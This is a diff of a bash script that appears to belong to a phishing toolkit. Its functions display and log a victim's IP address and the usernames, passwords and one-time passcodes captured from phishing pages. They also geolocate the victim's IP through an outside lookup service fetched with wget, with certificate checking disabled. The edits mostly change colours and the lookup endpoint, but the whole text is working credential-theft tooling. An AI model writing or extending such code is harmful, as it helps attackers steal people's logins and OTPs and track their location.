@@ -792,9 +792,9 @@ capture_data_3() {
 
 ## Get IP address
 capture_ip() {
-##      IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
-	IP=$(awk -F 'IP: ' '{print $2}' .server/www/ip.txt | xargs)
-	echo "${MAGENTABG}${CYAN}"
+	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+##	IP=$(awk -F 'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+	echo "${MAGENTABG}${BLACK}"
         echo -e " Victim's IP : $IP ${RESETBG}"
 	echo "${RESETBG}${NC}"
 	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
@@ -816,12 +816,12 @@ save_ip() {
 	rm -rf .server/www/ip.txt
 }
 ip_details() {
-	IP=$1
-	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Trying to fetch details of IP:${BLUE}$1${NC}"
-	wget --no-check-certificate "https://ipwho.is/${IP}" -O rawtrack.txt > /dev/null 2>&1
-##	curl -s -L http://ipwho.is/${IP} > rawtrack.txt
+	echo " " 
+	echo "${RED}[${WHITE}-${RED}]${GREEN} Trying to capture details of IP : ${BLUE}${IP} "
+##	curl -s -L "http://ipwhois.app/json/$IP" -o rawtrack.txt
+	wget --no-check-certificate "http://ipwhois.app/json/${IP}" -O rawtrack.txt > /dev/null 2>&1
 	sleep 2
-	grep -o '"[^"]*"\s*:\s"*[^,]*' rawtrack.txt > track.txt
+	grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
 	iptt=$(sed -n 's/"ip"://p' track.txt)
 	if [[ $iptt != "" ]]; then
 		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
@@ -885,7 +885,7 @@ ip_details() {
 
 ## Get credentials
 capture_id() {
-	echo "${MAGENTABG}${CYAN}"
+	echo "${MAGENTABG}${BLACK}"
         cat .server/www/usernames.txt
 	echo "${RESETBG}${NC}"
         echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
@@ -896,7 +896,7 @@ capture_id() {
 
 ## Get credentials
 capture_pass() {
-	echo "${MAGENTABG}${CYAN}"
+	echo "${MAGENTABG}${BLACK}"
 	cat  .server/www/pass.txt
 	echo "${RESETBG}${NC}"
         echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
@@ -907,7 +907,7 @@ capture_pass() {
 
 ## Get otp
 capture_otp() {
-	echo "${MAGENTABG}${CYAN}"
+	echo "${MAGENTABG}${BLACK}"
         cat  .server/www/otp.txt
 	echo "${RESETBG}${NC}"
         echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
